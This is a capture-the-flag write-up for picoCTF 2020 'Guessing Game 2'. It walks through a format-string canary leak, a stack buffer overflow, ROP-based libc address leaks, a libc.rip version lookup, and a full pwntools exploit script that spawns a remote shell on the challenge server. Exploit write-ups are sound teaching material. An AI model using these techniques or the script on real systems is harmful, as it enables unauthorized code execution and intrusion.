---
layout: post
title: Getting libc version by leaking addresses - picoCTF 2020 Mini-Competition Guessing Game 2
tags: [CTF, pwn]
---

> It's the Return of your favorite game! vuln vuln.c Makefile nc jupiter.challenges.picoctf.org 13775

## Static Analysis

```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=24c4fa8500082ef048a420baadc6a3d777d39f34, not stripped
```

```
$ checksec ./vuln
[*] '/home/nick/coding/pico/guessing2/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

This time we have a 32-bit Full-RELRO binary with stack canary, which means we can't overwrite GOT and we have to find some way to deal with the canary.

Let's take a look at the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 512


long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);
	printf("Congrats: ");
	printf(winner);
	printf("\n\n");
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n");
	printf("Version: %x\n\n", get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

So

1. We have to brute force the answer, but only once since the instance probably runs on a fork-and-accept server, which means that `ans` will be the same unless the instance is restarted.
2. In `win()` we have format string vulnerability and buffer overflow.
   - For format string, we can leak the stack canary.
   - For buffer overflow, we can use it for ROP.

## Leaking the Stack Canary

Let's take a look at the disassembly of `win`

```
Dump of assembler code for function win:
   0x0804876e <+0>:	push   ebp
   0x0804876f <+1>:	mov    ebp,esp
   0x08048771 <+3>:	push   ebx
   0x08048772 <+4>:	sub    esp,0x214
   0x08048778 <+10>:	call   0x8048570 <__x86.get_pc_thunk.bx>
   0x0804877d <+15>:	add    ebx,0x183f
   0x08048783 <+21>:	mov    eax,gs:0x14
   0x08048789 <+27>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804878c <+30>:	xor    eax,eax
   0x0804878e <+32>:	sub    esp,0xc
   0x08048791 <+35>:	lea    eax,[ebx-0x15fd]
   0x08048797 <+41>:	push   eax
   0x08048798 <+42>:	call   0x8048470 <printf@plt>
   0x0804879d <+47>:	add    esp,0x10
   0x080487a0 <+50>:	sub    esp,0xc
   0x080487a3 <+53>:	lea    eax,[ebp-0x20c]
   0x080487a9 <+59>:	push   eax
   0x080487aa <+60>:	call   0x8048480 <gets@plt>
   0x080487af <+65>:	add    esp,0x10
   0x080487b2 <+68>:	sub    esp,0xc
   0x080487b5 <+71>:	lea    eax,[ebx-0x15ea]
   0x080487bb <+77>:	push   eax
   0x080487bc <+78>:	call   0x8048470 <printf@plt>
   0x080487c1 <+83>:	add    esp,0x10
   0x080487c4 <+86>:	sub    esp,0xc
   0x080487c7 <+89>:	lea    eax,[ebp-0x20c]
   0x080487cd <+95>:	push   eax
   0x080487ce <+96>:	call   0x8048470 <printf@plt>
   0x080487d3 <+101>:	add    esp,0x10
   0x080487d6 <+104>:	sub    esp,0xc
   0x080487d9 <+107>:	lea    eax,[ebx-0x15df]
   0x080487df <+113>:	push   eax
   0x080487e0 <+114>:	call   0x80484c0 <puts@plt>
   0x080487e5 <+119>:	add    esp,0x10
   0x080487e8 <+122>:	nop
   0x080487e9 <+123>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080487ec <+126>:	xor    eax,DWORD PTR gs:0x14
   0x080487f3 <+133>:	je     0x80487fa <win+140>
   0x080487f5 <+135>:	call   0x8048910 <__stack_chk_fail_local>
   0x080487fa <+140>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080487fd <+143>:	leave  
   0x080487fe <+144>:	ret    
End of assembler dump.
```

The stack canary check starts from `0x080487e9`, which suggests that the canary is stored at `$ebp-0xc`. Therefore we can break at the third `printf` (`0x080487bc`) and calculate `$ebp-$esp-0xc` for offset.

```
$esp   : 0xffffd0c0  →  0x080489d2  →  "Congrats: "
$ebp   : 0xffffd2e8  →  0xffffd308  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000

0x2e8-0xc0-0xc = 540
```

For `printf`, we are using `%p` which will move 4 byte per call. Therefore the offset is

```
540 / 4 = 135
```

We can then `printf("%135$p")` and leak the canary. Also the leaked stack canary can be reused through the session.

## Preparing for buffer overflow

To control `$eip`, we need to check the following
- offset to the stack canary
- offset to `$eip`

To achieve these, two pattern searches are enough

### Offset to stack canary
```
gef➤  pattern search $ebp-0xc
[+] Searching for '64616166'/'66616164' with period=4
[+] Found at offset 512 (little-endian search) likely
```

### Offset to `$eip`

Here we're using pwntools since we're sending non-printable bytes
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

gdbscript = """break *0x080487fe"""

io = process('./vuln')

io.sendline(b'-2495')
io.clean()
io.sendline(b'%135$p')
canary = io.recvline(keepends=False).decode('ascii').split(':')[1].strip()
log.success(f'Stack canary: {canary}')
canary = p32(int(canary, 16))

io.sendline(b'-2495')

gdb.attach(io, gdbscript)
io.sendline(b'A'*512+canary+cyclic(100))
io.interactive()
```

```
gef➤  info frame
Stack level 0, frame at 0xffd425a0:
 eip = 0x80487fe in win; saved eip = 0x61616164
 called by frame at 0xffd425a4
 Arglist at 0x61616163, args: 
 Locals at 0x61616163, Previous frame's sp is 0xffd425a0
 Saved registers:
  eip at 0xffd4259c
```

We can then get the offset by opening another python interpreter
```
>>> from pwn import *
>>> cyclic_find(0x61616164)
12
```

Therefore the payload would be

```
'A' * 512 + canary + 'B' * 12 + ROP chain
```

## Leaking `glibc` Base Address and the ROP Chain

This is a dynamically-linked binary, which means there is glibc in the execution context.

To calculate the base address, we need to know the offset of a function inside `libc.so.6`. In [Here's a libc](https://nickchen120235.github.io/2021/08/17/return-oriented-programming.html) the remote `libc.so.6` is given, therefore we can find the offset and calculate the base address.

However in this challenge the remote `libc.so.6` is not given, therefore we need to know the version of glibc that remote is using. To achieve this, we leak the address of TWO different functions and calculate the offset between them. This offset differs between different versions of glibc, therefore we can identify the version by this information.

There is a cool website [libc.rip](https://libc.rip) that does exactly this. It outputs the possible version of glibc given at least two addresses along with other useful information like the offset to `system()` and `/bin/sh`. It also offers [an API endpoint](https://github.com/niklasb/libc-database/tree/master/searchengine).

As in Here's a libc, we need `puts@plt` to leak anything. According to x86 calling convention, the arguments are stored on the stack. Also the return address should be in front of the first argument. We're returning to `win` after the leaking address to reuse the buffer overflow. Here I'm picking `puts` and `printf` as the target functions. The ROP chain would be

```
<address to puts@plt> + <address to win> + <address to puts@got>
```

and

```
<address to puts@plt> + <address to win> + <address to printf@got>
```

Then we ask libc.rip for possible versions of glibc and calculate the addresses of the base, `system()` and `/bin/sh` accordingly.

We prepare the final payload as the following

```
<address to system()> + <4-byte dummy input> + <address to /bin/sh>
```

> We can put anything into the 4-byte dummy input as we are not returning to the original program anymore.

## Solution

```python
import requests
from pwn import *
from time import sleep
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./vuln')

gdbscript = f"""break *0x080487fe"""
# io = gdb.debug('./vuln', gdbscript=gdbscript)
# io = process('./vuln')
io = remote('jupiter.challenges.picoctf.org', 13775)
sleep(1)
io.clean()

ans = -3727
# with log.progress('Guessing answer') as p:
#   for i in range(-4096, 4096):
#     p.status(i)
#     io.sendline(str(i).encode('ascii'))
#     res = io.recvline()
#     sleep(1)
#     io.clean()
#     print(i, res)
#     if b'You win' in res:
#       ans = i
#       break
log.success(f'The answer is {ans}')
ans = str(ans).encode('ascii')
io.sendline(ans)
log.info('Leaking stack canary')
leak_canary = b'%135$p'
sleep(1)
io.clean()
io.sendline(leak_canary)
canary = io.recvline(keepends=False).decode('ascii').split(':')[1].strip()
log.success(f'Stack canary: {canary}')
canary = p32(int(canary, 16))

DUMMY_LEN = 512
log.info(f'DUMMY_LEN: {DUMMY_LEN}')

log.info('Leaking libc base')
log.info(f'win is at {hex(elf.sym["win"])}')
log.info(f'puts@plt is at {hex(elf.plt["puts"])}')
log.info(f'puts@got.plt is at {hex(elf.got["puts"])}')

payload  = b'A' * DUMMY_LEN + canary + b'B' * 12
payload += p32(elf.plt['puts']) + p32(elf.sym['win']) + p32(elf.got['puts'])
io.sendline(ans)
sleep(1)
io.clean()
io.sendline(payload)
sleep(1)
io.recvline()
io.recvline()
libc_puts = int.from_bytes(io.recvline()[:4], 'little')
log.success(f'Found puts@libc: {hex(libc_puts)}')
payload  = b'A' * DUMMY_LEN + canary + b'B' * 12
payload += p32(elf.plt['puts']) + p32(elf.sym['win']) + p32(elf.got['printf'])
sleep(1)
io.clean()
io.sendline(payload)
sleep(1)
io.recvline()
io.recvline()
libc_printf = int.from_bytes(io.recvline()[:4], 'little')
log.success(f'Found printf@libc: {hex(libc_printf)}')

libc_base = 0
libc_system = 0
libc_bin_sh = 0
with log.progress('Asking libc.rip for glibc info') as p:
  query = {
    'symbols': {
      'puts': hex(libc_puts),
      'printf': hex(libc_printf)
    }
  }
  r = requests.post('https://libc.rip/api/find', json=query)
  r.raise_for_status()
  if len(r.json()) > 1:
    log.warn('More than one match found! Using the first result.')
  res = r.json()[0]
  log.success(f'glibc id: {res["id"]}')
  offset = res['symbols']
  libc_base = libc_puts - int(offset['puts'], 16)
  libc_system = libc_base + int(offset['system'], 16)
  libc_bin_sh = libc_base + int(offset['str_bin_sh'], 16)

log.success(f'libc is at {hex(libc_base)}')
log.success(f'system() is at {hex(libc_system)}')
log.success(f'"/bin/sh" is at {hex(libc_bin_sh)}')
log.info('YOLO!')
payload  = b'A' * DUMMY_LEN + canary + b'B' * 12
payload += p32(libc_system) + b'AAAA' + p32(libc_bin_sh)
io.clean()
io.sendline(payload)
io.interactive()
```
